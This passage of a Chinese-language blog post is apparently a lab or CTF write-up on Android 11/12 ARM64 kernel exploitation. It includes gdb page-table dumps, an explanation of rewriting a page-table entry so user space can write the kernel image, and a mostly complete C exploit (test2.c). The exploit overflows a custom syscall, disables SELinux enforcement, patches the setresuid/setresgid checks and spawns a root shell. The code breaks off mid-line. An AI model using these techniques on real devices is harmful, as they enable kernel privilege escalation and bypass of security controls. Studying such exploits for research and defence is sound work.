RE_MAP_ADDR + <span class="number">0x80000</span> + (setresgid_if_addr - IMAGE_BASE);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresgid_if_addr_new+<span class="number">3</span>) = <span class="number">0x36</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresgid_if_addr_new content: 0x%lx\n&quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)setresgid_if_addr_new);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="android-12"   >
          <a href="#android-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-12" class="headerlink" title="android 12"></a>android 12</h2>
      <blockquote>
<p>内核版本： linux 5.10.160</p>
</blockquote>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/iomem</span></span><br><span class="line">[...]</span><br><span class="line">40000000-bfffffff : System RAM</span><br><span class="line">  40200000-4266ffff : Kernel code</span><br><span class="line">  42670000-4296ffff : reserved</span><br><span class="line">  42970000-42c6ffff : Kernel data</span><br><span class="line">  47fff000-48416fff : reserved</span><br><span class="line">  48600000-4860ffff : reserved</span><br><span class="line">  ad400000-bf9fffff : reserved</span><br><span class="line">  bfa16000-bfa95fff : reserved</span><br><span class="line">  bfa96000-bfb96fff : reserved</span><br><span class="line">  bfb97000-bfbd8fff : reserved</span><br><span class="line">  bfbdb000-bfbdbfff : reserved</span><br><span class="line">  bfbdc000-bfbddfff : reserved</span><br><span class="line">  bfbde000-bfbdefff : reserved</span><br><span class="line">  bfbdf000-bfbdffff : reserved</span><br><span class="line">  bfbe0000-bfc00fff : reserved</span><br><span class="line">  bfc01000-bfc0afff : reserved</span><br><span class="line">  bfc0b000-bfffffff : reserved</span><br><span class="line">[...]</span><br></pre></td></tr></table></div></figure>


<p>利用方法同android 11，所以要将 0xffffffc200000000 对应的一级页表项设置成 d_block，让用户态可以任意读写内核image。</p>
<ol>
<li><p>该一级页表项对应两处虚拟地址</p>
<p>一处是在 swapper_pg_dir 中的偏移</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/2gx 0xFFFFFFC00A466000+0x840</span><br><span class="line">0xffffffc00a466840 &lt;swapper_pg_dir+2112&gt;:       0x00680081c0000701      0x0068008200000701</span><br></pre></td></tr></table></div></figure>
<p>一处是在线性映射区中的偏移</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">&gt;&gt;&gt; hex(0xffffffc00a466840-0xFFFFFFC008000000 + 0x200000)</span><br><span class="line"><span class="string">&#x27;0x2666840&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 线性映射区在0xFFFFFF8000000000</span></span><br><span class="line"><span class="comment"># 对应页表项也映射到了虚拟地址 0xffffff8002666840 处</span></span><br><span class="line">gef➤  x/2gx 0xFFFFFF8000000000+0x2666840</span><br><span class="line">0xffffff8002666840:     0x00680081c0000701      0x0068008200000701</span><br><span class="line"></span><br><span class="line">40000000-bfffffff : System RAM</span><br><span class="line">  40200000-4266ffff : Kernel code</span><br><span class="line">  42670000-4296ffff : reserved</span><br><span class="line">  42970000-42c6ffff : Kernel data</span><br></pre></td></tr></table></div></figure>
<p>通过线性映射区可以接着调试查看二级页表，三级页表。由于 0xffffff8002666840 处是只读的，我们考虑将 0xffffff8002666000 对应的页表项设置成用户态和内核态可读写的状态，这样就可以在用户态写一级页表了。</p>
</li>
<li><p>0xffffff8002666000 地址对应的物理页表项</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0xffffff8002666000 </span><br><span class="line">11111111 11111111 11111111 10000000 00000010 01100110 01100000 00000000</span><br><span class="line">0级页表未使用</span><br><span class="line">1级页表偏移：0000000 00 - 0*8</span><br><span class="line">2级页表偏移：000010 011 - 19*8=0x98</span><br><span class="line">3级页表偏移：00110 0110 - 102*8=0x330</span><br><span class="line"></span><br><span class="line">gef➤  x/20gx 0xFFFFFF8000000000+0x2666840</span><br><span class="line">0xffffff8002666840:     0x00680081c0000701      0x0068008200000701</span><br><span class="line">0xffffff8002666850:     0x0068008240000701      0x0068008280000701</span><br><span class="line">0xffffff8002666860:     0x00680082c0000701      0x0068008300000701</span><br><span class="line">0xffffff8002666870:     0x0068008340000701      0x0068008380000701</span><br><span class="line">0xffffff8002666880:     0x00680083c0000701      0x0000000000000000</span><br><span class="line">0xffffff8002666890:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff80026668a0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff80026668b0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff80026668c0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff80026668d0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">gef➤  x/20gx 0xFFFFFF8000000000+0x2666000</span><br><span class="line">0xffffff8002666000:     0x00000000bfffa003      0x00000000bfe0b003</span><br><span class="line">0xffffff8002666010:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666020:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666030:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666040:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666050:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666060:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666070:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666080:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff8002666090:     0x0000000000000000      0x0000000000000000</span><br><span class="line">gef➤   x/20gx 0xFFFFFF8000000000+(0xbfffa000-0x40000000)+0x98</span><br><span class="line">0xffffff807fffa098:     0x00000000bfff8003      0x00000000bfff7003</span><br><span class="line">0xffffff807fffa0a8:     0x00000000bfff6003      0x00000000bfff5003</span><br><span class="line">0xffffff807fffa0b8:     0x00000000bfff4003      0x00000000bfff3003</span><br><span class="line">0xffffff807fffa0c8:     0x00000000bfff2003      0x00000000bfff1003</span><br><span class="line">0xffffff807fffa0d8:     0x00000000bfff0003      0x00000000bffef003</span><br><span class="line">0xffffff807fffa0e8:     0x00000000bffee003      0x00000000bffed003</span><br><span class="line">0xffffff807fffa0f8:     0x00000000bffec003      0x00000000bffeb003</span><br><span class="line">0xffffff807fffa108:     0x00000000bffea003      0x00000000bffe9003</span><br><span class="line">0xffffff807fffa118:     0x00000000bffe8003      0x00000000bffe7003</span><br><span class="line">0xffffff807fffa128:     0x00000000bffe6003      0x00000000bffe5003</span><br><span class="line">gef➤   x/20gx 0xFFFFFF8000000000+(0xbfff8000-0x40000000)+0x330</span><br><span class="line">0xffffff807fff8330:     0x0060000042666783      0x0060000042667783</span><br><span class="line">0xffffff807fff8340:     0x0060000042668783      0x0060000042669783</span><br><span class="line">0xffffff807fff8350:     0x006000004266a783      0x006000004266b783</span><br><span class="line">0xffffff807fff8360:     0x006000004266c783      0x006000004266d783</span><br><span class="line">0xffffff807fff8370:     0x006000004266e783      0x006000004266f783</span><br><span class="line">0xffffff807fff8380:     0x0068000042670707      0x0068000042671707</span><br><span class="line">0xffffff807fff8390:     0x0068000042672707      0x0068000042673707</span><br><span class="line">0xffffff807fff83a0:     0x0068000042674707      0x0068000042675707</span><br><span class="line">0xffffff807fff83b0:     0x0068000042676707      0x0068000042677707</span><br><span class="line">0xffffff807fff83c0:     0x0068000042678707      0x0068000042679707</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xffffff807fff8330 处就是 0xffffff8002666000 虚拟地址对应的页表项</span></span><br><span class="line"><span class="comment"># 0x783：0111 1000 0011 - bit[7:6]表示仅内核态可读</span></span><br><span class="line"><span class="comment"># 0x743：0111 0100 0011 - bit[7:6]表示用户态和内核态可读写</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>写物理页表项</p>
<p>将虚拟地址 0xffffff807fff8330 处写成 0x0060000042666743 ，使 0xffffff8002666000 这个页面用户态可读写，那么就能将我们精心构造的d_block写入 0xffffff8002666840 中，从而达到任意读写内核image的目的了。</p>
</li>
</ol>
<p>本地 root shell</p>
<p><img   src="image-20230906144747651.png?size=600" style="width: 600px;"  alt="image-20230906144747651"></p>
<p>exp如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_RET 0xFFFFFFC0000BECC8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_read - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_write - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_PHYS_ADDR 0x40200000</span></span><br><span class="line"><span class="comment">// #define RE_MAP_ADDR 0xFFFFFFC500000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RE_MAP_ADDR 0xFFFFFFC200000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_BASE 0xFFFFFFC008000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> SYMBOL__swapper_pg_dir = <span class="number">0xFFFFFFC00A466000</span>;              <span class="comment">// in android11 there is a swapper_pg_dir symbol</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remap_addr_pte = <span class="number">0xffffff807fff8330</span>;              <span class="comment">// linear addr space</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remap_addr_dblock_addr = <span class="number">0xffffff8002666840</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mirror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_phys, <span class="keyword">unsigned</span> <span class="keyword">long</span> mirror_base)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index1 = (mirror_base &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>; <span class="comment">// bits[39:31]</span></span><br><span class="line">    d_block_addr = SYMBOL__swapper_pg_dir + index1 * <span class="number">8</span>;  <span class="comment">// target Table Descriptor Address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descriptor: 0x%lx + %d x 8 = 0x%lx\n&quot;</span>, SYMBOL__swapper_pg_dir, index1, d_block_addr);</span><br><span class="line"></span><br><span class="line">    d_block = <span class="number">0</span>;</span><br><span class="line">    d_block |= <span class="number">0x1</span> ; <span class="comment">// Block entry</span></span><br><span class="line">    <span class="comment">/* Lower attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// bits[11], nG</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">10</span>); <span class="comment">// bits[10], AF</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">9</span>); <span class="comment">// bits[9], SH[1]</span></span><br><span class="line">    d_block |= <span class="number">0x40</span>; <span class="comment">// bits[7:6], AP[2:1] = 01</span></span><br><span class="line">    d_block |= <span class="number">0x20</span>; <span class="comment">// bits[5], NS</span></span><br><span class="line">    d_block |= <span class="number">0x10</span>; <span class="comment">// bits[2:0], AttrIndx[2:0]</span></span><br><span class="line">    d_block |= (kernel_phys &amp; <span class="number">0x0000ffffc0000000</span>); <span class="comment">// bits[47:30], output address</span></span><br><span class="line">    <span class="comment">/* Upper attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">52</span>); <span class="comment">// bits[52], Contiguous</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">53</span>); <span class="comment">// bits[53], PXN</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">54</span>); <span class="comment">// bits[54], XN</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d_block = 0x%lx\n&quot;</span>, d_block);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = mmap(<span class="number">0x60000000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>( buf == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);    </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = buf + (<span class="number">0x1000</span><span class="number">-0x9b0</span>);</span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x9b0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte;           <span class="comment">// remap_addr_pte; </span></span><br><span class="line">    hexdump(read_buf, <span class="number">0x9b0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*0x42666743*/</span></span><br><span class="line">    <span class="keyword">int</span> write_size = <span class="number">0x9b0</span>+<span class="number">0x13</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">1</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x37</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">2</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x36</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">3</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x12</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)remap_addr_dblock_addr = d_block;                <span class="comment">// make 0xfffffffc20000000 &lt;--&gt; phys_0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// write kernel image</span></span><br><span class="line">    <span class="comment">/* selinux_enforcing*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFFC00AA2FB88</span>;              <span class="comment">// android11上是selinux_state+1的位置，而android12上又无需加1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr_new = RE_MAP_ADDR + <span class="number">0x200000</span> + (selinux_enforcing_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selinux_enforcing_addr_new: 0x%lx\n&quot;</span>, selinux_enforcing_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span>*)selinux_enforcing_addr_new = <span class="number">0x0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;selinux_enforcing_addr_new content: 0x%lx\n&quot;, *(char*)selinux_enforcing_addr_new);</span></span><br><span class="line">    <span class="comment">/* sys_setresuid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr = <span class="number">0xFFFFFFC00815E214</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr_new = RE_MAP_ADDR + <span class="number">0x200000</span> + (setresuid_if_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid_if_addr_new: 0x%lx\n&quot;</span>,setresuid_if_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresuid_if_addr_new+<span class="number">3</span>) = <span 